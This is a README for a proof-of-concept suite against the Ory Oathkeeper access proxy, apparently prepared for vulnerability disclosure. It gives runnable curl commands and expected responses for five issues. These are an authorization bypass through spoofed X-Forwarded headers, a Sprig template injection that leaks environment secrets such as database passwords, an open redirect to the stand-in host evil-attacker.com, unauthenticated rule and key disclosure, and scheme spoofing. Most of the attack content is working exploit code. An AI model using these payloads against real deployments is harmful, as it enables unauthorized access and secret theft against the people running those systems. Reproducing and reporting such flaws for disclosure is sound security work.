# Ory Oathkeeper Vulnerability PoC Suite

## Prerequisites

- Docker + docker-compose
- curl
- python3 or jq (for JSON parsing)
- Ports 4455 and 4456 available

## Quick Start

### Test Vulns #1, #4, #6, #7 (Auth Bypass, Open Redirect, Info Disclosure, Scheme Spoofing)

```bash
cd poc/
docker-compose up -d
sleep 5
bash run_all_poc.sh
docker-compose down
```

### Test Vuln #2 (SSTI / Environment Variable Leakage)

```bash
cd poc/
docker-compose -f docker-compose-ssti.yml up -d
sleep 5
bash poc_ssti.sh
docker-compose -f docker-compose-ssti.yml down
```

## Manual Reproduction Commands

### Vuln #1: Decision API Auth Bypass

```bash
# Baseline: admin path should be denied
curl -v http://127.0.0.1:4456/decisions/admin/dashboard
# Expected: 403 Forbidden

# Attack: spoof headers to match the allowed /public/* rule instead
curl -v \
  -H "X-Forwarded-Method: GET" \
  -H "X-Forwarded-Host: 127.0.0.1:4455" \
  -H "X-Forwarded-Uri: /public/anything" \
  -H "X-Forwarded-Proto: http" \
  http://127.0.0.1:4456/decisions/admin/dashboard
# Expected: 200 OK (BYPASSED — matched /public/* rule)
```

### Vuln #2: SSTI Environment Variable Leak

Use `docker-compose-ssti.yml` which loads `rules_ssti.json`.

```bash
# This rule has: "X-Env-Leaked": "{{ env \"SECRET_ENV_VAR\" }}"
# httpbin.org echoes back all received headers
curl -s http://127.0.0.1:4455/ssti/test | python3 -m json.tool

# Look for headers like:
#   "X-Env-Leaked": "SuperSecretDatabasePassword123"
#   "X-Db-Leaked": "postgres://admin:s3cret@internal-db:5432/prod"
```

### Vuln #4: Open Redirect

```bash
# Normal denied request with redirect
curl -v -H "Accept: text/html" http://127.0.0.1:4455/admin/dashboard
# Expected: 302 -> https://login.example.com/auth?return_to=http%3A%2F%2F127.0.0.1...

# Attack: inject attacker domain into return_to
curl -v \
  -H "Accept: text/html" \
  -H "X-Forwarded-Host: evil-attacker.com" \
  -H "X-Forwarded-Proto: https" \
  -H "X-Forwarded-Uri: /steal-creds" \
  http://127.0.0.1:4455/admin/dashboard
# Expected: 302 -> https://login.example.com/auth?return_to=https%3A%2F%2Fevil-attacker.com%2Fsteal-creds
```

### Vuln #6: Unauthenticated Rule Disclosure

```bash
# Dump ALL rules — no auth needed
curl -s http://127.0.0.1:4456/rules | python3 -m json.tool

# Get JWKS keys — no auth needed
curl -s http://127.0.0.1:4456/.well-known/jwks.json | python3 -m json.tool
```

### Vuln #7: Scheme Spoofing

```bash
# Normal (http scheme, matches http:// rules)
curl -v http://127.0.0.1:4455/public/test

# Spoofed (forces https scheme — may not match http:// only rules)
curl -v -H "X-Forwarded-Proto: https" http://127.0.0.1:4455/public/test
```

## Capturing Evidence

1. Run the PoC scripts and redirect output to a file:
   ```bash
   bash run_all_poc.sh 2>&1 | tee evidence_main.txt
   bash poc_ssti.sh 2>&1 | tee evidence_ssti.txt
   ```

2. Take screenshots of the terminal output

3. For Burp Suite evidence:
   - Set Burp as proxy: `export http_proxy=http://127.0.0.1:8080`
   - Re-run the curl commands
   - Export the Burp project as evidence

## Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Main test environment |
| `docker-compose-ssti.yml` | SSTI-specific test environment |
| `config.yaml` | Oathkeeper configuration |
| `rules.json` | Access rules for main PoCs |
| `rules_ssti.json` | Rules with malicious Sprig templates |
| `run_all_poc.sh` | Automated PoC runner (vulns 1,4,6,7) |
| `poc_ssti.sh` | SSTI-specific PoC runner (vuln 2) |
